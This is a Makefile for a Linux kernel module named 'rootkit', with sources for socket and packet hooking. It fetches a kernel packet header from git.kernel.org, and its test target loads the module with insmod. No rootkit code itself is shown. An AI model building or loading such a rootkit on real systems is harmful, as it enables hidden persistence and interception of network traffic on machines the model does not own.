# Module name
ROOTKIT		    := rootkit

# Linux kernel files
MODULEDIR	    := /lib/modules/$(shell uname -r)
BUILDDIR	    := $(MODULEDIR)/build

KERNEL_VERSION ?= 5.4

PACKET_HEADER_LOCATION := src/socket/af_packet_internal.h

# # Module Headers
# # This enables importing headers using <>, but can conflict with linux kernel headers.
# HEADERS	        := src/headers
# ccflags-y	    := -I$(HEADERS)

# Module Sources
$(ROOTKIT)-y 	+= src/main.o
$(ROOTKIT)-y 	+= src/networking.o
$(ROOTKIT)-y 	+= src/sockets.o
$(ROOTKIT)-y 	+= src/socket/hook.o
$(ROOTKIT)-y 	+= src/socket/packet_hook.o

# Module output
obj-m           := $(ROOTKIT).o

.PHONY: build clean watch test

build: $(PACKET_HEADER_LOCATION)
	$(MAKE) -C $(BUILDDIR) M=$(PWD) modules

$(PACKET_HEADER_LOCATION):
	wget https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/plain/net/packet/internal.h?h=v$(KERNEL_VERSION) -O $@

clean:
	$(MAKE) -C $(BUILDDIR) M=$(PWD) clean
	rm $(PACKET_HEADER_LOCATION)

watch:
	sudo dmesg -C
	dmesg -w

test:
	sudo dmesg -C
	sudo insmod ${ROOTKIT}.ko
	dmesg -w
